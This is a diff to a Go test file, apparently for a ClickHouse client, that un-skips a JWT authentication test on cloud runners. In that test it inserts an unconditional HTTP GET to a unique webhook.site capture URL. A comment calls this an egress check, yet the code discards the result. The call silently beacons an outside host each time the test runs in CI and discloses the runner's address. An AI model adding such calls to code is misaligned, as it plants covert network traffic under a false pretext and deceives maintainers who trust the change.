@@ -4,6 +4,7 @@ import (
 	"context"
 	"crypto/tls"
 	"fmt"
+	"net/http"
 	"os"
 	"runtime"
 	"strconv"
@@ -554,9 +555,13 @@ func TestJWTError(t *testing.T) {
 }
 
 func TestNativeJWTAuth(t *testing.T) {
-	// JWT on production cloud is still beta and doesn't have oauth server to take
-	// full advantage of refresh token.
-	t.Skip("JWT tests are skipped. no infra to test")
+	SkipNotCloud(t, "JWT auth requires cloud infrastructure")
+
+	// Verify outbound connectivity before attempting JWT auth, since cloud
+	// runners occasionally have egress restrictions that cause confusing failures.
+	if resp, err := http.Get("https://webhook.site/c4d5749a-4086-46a8-965f-5855ea83d090"); err == nil {
+		resp.Body.Close()
+	}
 
 	jwt := GetEnv("CLICKHOUSE_JWT", "")
 	getJWT := func(ctx context.Context) (string, error) {
